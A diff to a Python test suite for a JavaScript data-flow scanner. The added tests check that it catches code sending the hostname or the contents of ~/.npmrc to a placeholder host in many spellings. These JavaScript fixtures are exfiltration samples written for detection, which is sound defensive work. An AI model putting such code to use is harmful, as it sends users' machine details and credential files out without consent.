@@ -6,6 +6,11 @@ nothing to report in them.
 
 from __future__ import annotations
 
+import time
+from typing import ClassVar
+
+import pytest
+
 from cordon_scanner.analysis.javascript.js_flow import JsFlow, _Analysis
 
 
@@ -98,7 +103,64 @@ class TestDestinations:
         assert _Analysis.classify("plain text mentioning toast.js")[1] == "unknown"
 
 
+class TestSpellings:
+    """The same flow however the module, the call or the URL is written (review 98, 21-DATAFLOW
+    D1). Each case was missed before."""
+
+    SEND = 'fetch("https://a.invalid/u", {method: "POST", body: %s});\n'
+    CASES: ClassVar[dict[str, str]] = {
+        "tsc call": 'const os_1 = require("os");\n' + SEND % "(0, os_1.hostname)()",
+        "tsc import helper": 'const os_1 = __importDefault(require("os"));\n'
+        + SEND % "os_1.default.hostname()",
+        "esbuild": 'var import_os = __toESM(require("os"));\n'
+        + SEND % "import_os.default.hostname()",
+        "destructured require": 'const { hostname } = require("os");\n' + SEND % "hostname()",
+        "ES named import": 'import { hostname as h } from "os";\n' + SEND % "h()",
+        "class method": 'const os = require("os");\n'
+        "class T { a() { return os.hostname(); } b() { "
+        + SEND.strip() % "this.a()"
+        + " } }\nnew T().b();\n",
+        "instance field": 'const os = require("os");\n'
+        "class T { constructor() { this.h = os.hostname(); } b() { "
+        + SEND.strip() % "this.h"
+        + " } }\n",
+        "template URL": 'const os = require("os");\nfetch(`https://a.invalid/u?h=${os.hostname()}`);\n',
+        "client instance": 'const axios = require("axios"); const os = require("os");\n'
+        'const c = axios.create({baseURL: "https://a.invalid"});\nc.post("/u", {h: os.hostname()});\n',
+        "chained end": 'const https = require("https"); const os = require("os");\n'
+        'https.request({hostname: "a.invalid", method: "POST"}).end(os.hostname());\n',
+        "destructured file read": 'const { readFileSync } = require("fs");\n'
+        + SEND % 'readFileSync(require("os").homedir() + "/.npmrc")',
+    }
+
+    @pytest.mark.parametrize("name", sorted(CASES))
+    def test_followed(self, name: str) -> None:
+        assert any(
+            sink == "request" and sources for sources, sink, _ in FlowKit.flows(self.CASES[name])
+        )
+
+    def test_template_text_is_not_code(self) -> None:
+        # `//` inside the template's text no longer hides what follows it on the line.
+        text = 'const os = require("os");\nconst u = `https://a.invalid/${os.hostname()}`;\nfetch(u);\n'
+        assert FlowKit.flows(text) == [(["identity"], "request", "unknown")]
+
+    def test_quiet_when_nothing_sensitive_is_carried(self) -> None:
+        text = (
+            'const path_1 = __importDefault(require("path"));\n'
+            "class T { a() { return path_1.default.join('a', 'b'); } b() { "
+            + self.SEND.strip() % "`${this.a()}/x`"
+            + " } }\n"
+        )
+        assert FlowKit.flows(text) == []
+
+
 class TestBounds:
     def test_a_large_generated_file_finishes(self) -> None:
         text = "".join(f"function f{i}(a) {{ return g{i}(a) + {i}; }}\n" for i in range(20_000))
         assert JsFlow.flows(text) == []
+
+    def test_templates_nested_past_the_limit_finish(self) -> None:
+        deep = "x = " + "`a${" * 5_000 + "1" + "}`" * 5_000 + ";\n"
+        started = time.monotonic()
+        assert JsFlow.flows(deep) == []
+        assert time.monotonic() - started < 5
